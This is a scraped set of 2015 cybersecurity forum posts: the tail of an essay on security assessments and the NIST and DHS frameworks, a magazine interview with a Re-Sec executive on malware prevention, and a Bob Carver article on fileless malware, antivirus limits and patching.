teams responsible for recovery and remediation. It is not that assessment teams dont play well with others, rather OPM, Forbes, Target, and countless organizations with millions of customers - could give a crap about bonding experiences and neither should the assessed or the assessor. Assessments are meant to evolve cybersecurity. To evolve the posture and truly help an organization, assessments need to be aligned with readily available known frameworks. Not just guidelines those for a specific sectors (i.e. finance, energy, military), rather frameworks that will help those teams being assessed the opportunity to be successful after you leave. Most recently the Cybersecurity Framework developed by NIST along with the Cyber Resiliency Review (CRR) methodology from the U.S. DHS combined to provide a non-technical but area focused tool for organizations to build and also develop cybersecurity &amp; resiliency. The CRR attempts to help organizations by assessing controls across the following 10 operational domains: Asset Management Controls Management Configuration and Change Management Vulnerability Management Incident Management Service Continuity Management Risk Management External Dependencies Management Training and Awareness Situational Awareness While the Cybersecurity Framework focuses on functional areas, they are not intended to be assessed or performed in a serial manner. Rather the framework and the idea behind the concept is that organizations will employ the prioritized, flexible, repeatable, performance-based and cost-effective approach continuously and concurrently to enable a dynamic cybersecurity posture. The NIST CSF core focuses on the five functions to provide a strategic view: Identify Protect Detect Respond Recover Minimize The Stress To minimize the chances of getting A.S.S, one needs to have strong morals and beliefs to attenuate Stockholm Syndrome. In the case of being an assessor, be prepared. Always work with organizations ahead of time to ease fears and tension by providing clear guidance from the strategic, to hands-on methods that will be employed during the assessment. Working together before hand will minimize the excuses, violations, and need to bond  Allowing you to HELP organizations mature their cybersecurity posture. Don't get attached! "

We discussed cyber threat prevention and what is innovative in Re-Secs solution. Take a read! [eForensics Magazine]: We continue to see a growing number of large and unforeseen data breach attacks throughout the international marketplace. In your opinion, why do so many large corporations fail to defend themselves against cyber threats and what do they need to change in their strategies, if anything? dotan2[Dotan Bar Noy]: Organizations, especially in recent years, are very focused on trying to improve all aspects of their cyber defenses. Their perception of defense has broadened and they are combining active prevention techniques and detection solutions with intelligence and network monitoring systems. The problem is that these layers of defense are still easily breached by advanced modern threats, and these sophisticated threats are becoming very common. In addition to that, the multitude of solutions in the organization also cause two additional problems: Overwhelming the IT/security departments with a lot of irrelevant information, and preventing users from performing valid actions. When Organizations consider adding a new security measure they should look at the following factors:  The actual security level offered by the underlying technology. Does it actually solve a real problem or is it just a cool, well marketed solution.  Ease of use and flexibility. What is the level of impact on the end users? Does the solution require ongoing daily maintenance in order to operate? How simple is it to modify its policy?  How well the solution fits my organization a year from now? Can it fit changes we intend to implement in the near future? Organizations need to rank solutions in a manner that ensures the chosen set of solutions they use will provide the desired level of security, while allowing the users and IT departments to keep on doing their work. [eFM]: Do you think there is a way of limiting the amount of information IT departments get without compromising their work? After all, it relies heavily on intelligence and staying well informed. Is there a compromise? [DBN]: I think the correct approach to this would be to create segregated segments within the organization, each with its own security policy. The transfer of data between those segments (e.g. from the IT segment to the main product segment) should be closely monitored so that threats cant spread across domains. Obviously, segments use the lower security settings should be protected by additional measures so that an infection will be quickly detected within that segment. Creating the correct balance between usability and security is a continuous process that should not be taken lightly. [eFM]: Is it possible to create a perfect (or as close to perfect as possible) security solution that has a minimal impact on the end user? [DBN]: As a goal to strive to  YES. That is part of our mission at Re-Sec and we strongly believe it can be done. This mission becomes much easier once you put your focus on prevention (by white listing safe elements in the data that are allowed to pass) rather than detecting the exact name of the threat. This is analogous to going to the doctor and receiving a prescription for antibiotics. The doctor doesnt have to go through the process of precisely identifying the name of the threat. Instead, it is sufficient to detect the general family in order to cure the patient. [eFM]: In your opinion is cybersecurity perceived as magical by everyday users? Is it becoming an expert domain, where nothing is really understood by anyone outside of the IT department? [DBN]: I think cybersecurity is becoming an expert domain. The vast amount of solutions and tools dictates that in order to stay up-to-date with current technology (threats and resolutions) a person must be fully dedicated to this field. This, unfortunately, causes people that are not experts in this domain to perceive cybersecurity as somewhat magical. It is absolutely vital that people that deal with security have a deep understanding of the limitations and capabilities of the tools they are using in order to make the right selection of tools for each task. The end-users, on the other hand should not be required to understand the security technology that is used. They should be allowed work as usual and I would recommend organizations to favor solution that require a minimal amount of changes to the way users do their work. Placing complicated and cumbersome barriers before the users sometimes triggers them to look for ways to accomplish their work, that actually bypass security measures thus achieving the exact opposite result. [eFM]: Israel is commonly acknowledged as being a leader in cyber security. What are, in your opinion, the key factors that enable this type of innovative environment? [DBN]: Israel cyber industry emerged from the need to defend critical infrastructures and key industry organizations from a very large number of sophisticated attacks that happen on a daily basis. A generation of young and talented experts receive the best education by practicing real-life cyber warfare. Many of them attempt to translate their understanding and knowhow in order to create new and innovative defensive solutions. [eFM]: Do you see a difference between how companies in the U.S. defend themselves compared to Israeli companies? [DBN]: We see two main differences in the security approach of U.S. VS Israeli companies. The first difference is that U.S. companies follow a strict set of cultural rules and regulations, while Israeli companies are often governed by less formal set of rules. The second difference is that Israeli companies are more acceptable of innovative technologies and more open to experiment with early stage vendors. This relates also to the previous question and is part of the reason Israel offers an easier market for new cyber solution companies. However, making the transition from Israel to the U.S. market is often very challenging for companies that originate in Israel. [eFM]: You describe the U.S. enterprises as following strict, culturally driven regulations. Can you elaborate on that? Do you think that cultural differences have a big impact on business cybersecurity? Should they? [DBN]: A simple example would be device control Vs. policy. Many U.S. organization understand the potential risk allowing employees to use a DOK on their home computer and then in their office environment. Employees are often instructed not to use untrusted DOK devices, but the organization is not enforcing this policy by installing a device-control on the users computer. In Israel that would not be the case. As a result, one of the common attack vectors when performing penetration testing on U.S. organization would be to leave a USB DOK near (or at) the office. Social experiments found that in most cases these devices were soon after used by employees on the organizations computers (often with the good intention of returning the data to its owner). [eFM]: Re-Sec was selected by Kaspersky as one of the top security startup companies for 2015. What gives Re-Sec, as a young and growing company, such a competitive advantage? What do you do different? [DBN]: Re-Secs solution is unique in the cyber prevention landscape. Our solution creates a unique, fully-automated layer of prevention that is not based on signatures or behavior analysis. Our Content Disarm &amp; Reconstruct (CDR) makes prevention a simple and deterministic (!) process. Our motto Dont search for threats. Prevent them. is exactly the change we are offering to the perception of prevention. Our solutions ensure that the organizations data is completely free from known and unknown malware, APT, Zero-day threats, without changing the way users do their job or creating a lot of additional work for the IT department. [eFM]: From a strategic standpoint, what are some of the biggest challenges organizations currently face in the cybersecurity space? [DBN]: I see great challenges in creating a unified cyber policy that balances the security needs and allowed risk levels for every user group in the organization. Organizations need to map valid scenarios for every user and match the correct set of tools to it so that the risk level caused by this scenario is acceptable. Users receive information via a multitude of channels including email, web, removable drivers etc. and the organization MUST enforce a uniform cyber-policy that encompasses every data channel for every user and potential attack vector. [eFM]: Regulation and administration are very susceptible to the snowball effect and their growth can get out of control rather quickly. Are you worried that future efforts in that regard may result in unnecessary complications? [DBN]: Yes. In some cases we do see trends in regulations that may, in the future, prevent organizations from accomplishing their job. It is important to remember there should be a balance between the original purposes of the regulation (which is often the need to protect customers of the organization by enforcing a predefined level of security) with the need of the organization to operate. I think that regulations should be closely tied to the available technology and should not fail to take into consideration the productivity of the organization. [eFM]: What do you think are the most important lessons CISO can learn from the latest cyber incidents? [DBN]: In many cases we learn about incidents months after they take place so it is hard to react in real-time, as you are actually solving a year old problem. A few points that were emphasized lately: Keep you system up-to-date and monitor published vulnerabilities patches. Make sure your users are using up-to date tools and applications. Utilize to the fullest the solution already integrated. In many cases installed solutions are not utilized to full potential thus leaving possibly solved vectors open for attack. Training and culture  employees need to be aware of the risk and organizations need to educate employees about risks and the dangers that their actions make cause. Look for solutions that solve YOUR problems. A solution that works well for others may not match the needs of your organization. Judge each solution based on its actual benefit to your organization. [eFM]: Do you believe businesses should work towards better communicating with each other about threats? Nobody likes to talk about how their breach occurred and what exactly failed, but an alliance between enterprises could make the environment a safer place. [DBN]: I think that mutual sharing of security information will benefit all parties on the long run. However, it is difficult to motivate this process between competitors as this often stands in contrast to the short term goals of that business. To summarize, I think this is a very interesting, yet complex, topic and would love to further discuss this on a different occasion. [eFM]: Do you have any thoughts or advice you would like to share with our readers? [DBN]: Yes, we see many small vendors, like ourselves, struggling to offer interesting and useful solution to organizations. The cyber battle will not be won anytime soon, but the part of learning about new challenges and looking for solutions is the fun part. I think it is vital for the IT/security departments to enjoy the search and make it a major part of the routine. We at Re-Sec see it as our mission to allow organization to be prepared for the rapidly changing threat-landscape that they are facing today and will be facing moving forward.

1990,cybersecurity,cybersecurity,Cybersecurity: Age of Innocence Gone or No More Plausible Deniability by Bob Carver,4,3hp5lg,http://www.reddit.com/r/cybersecurity/comments/3hp5lg/cybersecurity_age_of_innocence_gone_or_no_more/,2015-08-20 19:14:04,"Hi Folks, Today we would like to share with you a great article by Bob Carver. Enjoy! Copyright  2015 Bob Carver CISM, CISSP, M.S. Addressing C-Suites, Boards and anyone that is vested in knowing the current state of cybersecurity. Rarely do we see massive popups anymore, nor PCs grinding slowly to a crawl post-infection. The scenario is now more like a Ninja in the middle of the night that deals a silent death blow, that turns your system into a Zombie with no telltale signs of compromise. Often there are no executables; it may be considered fileless infection. All the evidence of malware that security monitoring systems traditionally look for are not present. The compromised are completely unaware without awakening their AV, traditional IDS or firewalls from their slumber. Almost daily we are hearing about breaches. Fortelus Capital Management LLP, JP Morgan Chase, U.S. governments OPM, Anthem Healthcare, ECB, St. Louis Federal Reserve Bank, Belgiums foreign ministry, Germanys government web sites and the list goes on, almost forever. Yet I hear from people, I havent gotten infected in years. How do you know?, I ask. Their answer is My AV hasnt alarmed on anything. I respond, That may not be a reliable indictor. One recent report by Anti-Virus Kaspersky rated the risk of infection by country. The UK was at 33.8%, the US 34.4% risk. On the high end (in the EU) is Spain with 40.9% and Denmark has a relatively stellar 21.3% risk of infection. The rest of the EU countries are somewhere in the middle of this pack. The risk of your personal PC being infected is approximately one in three, give or take, depending upon where you live. Ironically two of the top three Anti-Virus suites for home users of Windows 8.1 have recently been hacked by cybercriminals (Kaspersky and Bitdefender). Cybercriminal organizations and nation-states have access to all brands of anti-virus security suites, IDS (Intrusion Detection Systems) and firewalls. If they dont personally have access, they hire third party cybercriminal organizations to test against all of these security systems before they release their malware or attacks into the wild, almost guaranteeing success of not being detected. Antivirus is dead says Brian Dye, Symantecs senior vice president for information security. In early 2014 he estimated that their anti-virus could only stop 45% of malware attacks. In 2015, the number of new malware has exploded. We have already hit 1.5 million new unique samples of malware each day, causing AV companies to be unable to keep up with the pace. It has been estimated if AV companies only used traditional signature-based detection, their databases would require disk space exceeding the vast majority of modern day corporate PCs. Currently, this author estimates that more advanced attacks and larger volumes has brought the effectiveness of AV to as low as 20  25% for new attacks (in the first 48 hours to 2 weeks after the malware is released). If your mobile or a kitchen appliance only worked 25% of the time you attempted to use it, most people would toss it in the bin and purchase a new one. Mobiles. Do you let them on your corporate Wi-fi network? Some variants of mobile malware have been known to transfer from the mobile to PCs. Also, mobile infections are reported at higher levels in the UK and EU than in North America. For some reason the U.S. and Canadian mobile users are more paranoid and will often restrict their software downloads from Google and Apple App Stores yielding a lower infection rate. Patching  yes patching of desktop PCs should take place as quickly as possible. 95% within the first week should be a good goal. Update Windows, Java, Adobe Flash, Microsoft Office and your browsers to the latest version. I have talked to risk managers that believed that if you only had a fully patched system, you would never see PCs compromised. I have seen compromised PCs that were fully patched and compliant starting approximately seven years ago. The mantra should be if a PC gets compromised because patches were not rolled out in a timely manner Shame on me. However, fully patched PCs will most likely continue to get compromised, regularly, unless they have moved to a more sophisticated, next generation endpoint protection. What should be the New Normal? Consider all systems on your network as untrusted (even network printers and IoT Internet of Things) and plan accordingly. Assume current generation anti-virus will not save you from compromise or infection. Start investigating next generation endpoint security, looking for methods such as containerization so infections will not be able to penetrate and write to the operating system. First Generation IDS will not detect many of the latest attacks and malware, usually based on relatively static signatures. If they do detect, the attack will change rendering the signature worthless in short order. Look at next generation intrusion detection systems that look at traffic to and from malicious domains and IPs on a dynamic basis, not static signatures. Assume any new sophisticated malware has been tested against all traditional AV, IDS systems and firewalls. Assume First Generation security will not stop or detect the majority sophisticated attacks. Assume some entity or cybercriminal has already gotten into your network or compromised one or more systems and is already inside. In the past we have been concerned about attacks from the outside. Now we need to be concerned about attacks and traffic from the inside. In the past we spent more time monitoring traffic attempting to get in our networks, now we need to monitor outbound traffic on all ports, protocols both standard and non-standard. Remember modern day cybersecurity is a highly dynamic environment, changing every day, if not by the minute. Governance utilizing standards such as NIST, ISO and ITIL are a good start, but should be considered the low bar and not the final destination. Modern day cybercriminal Ninjas just laugh at traditional barriers provided by compliance standards of governance. 2d49d17About the author: Bob Carver Cybersecurity /Risk Management/ Cyber Resiliency/ Botnet Monitoring/ Incident Management/ Security Monitoring Monitoring hundreds of botnets and ten of thousands infected endpoints including PCs, Smartphones and Apple OS X.
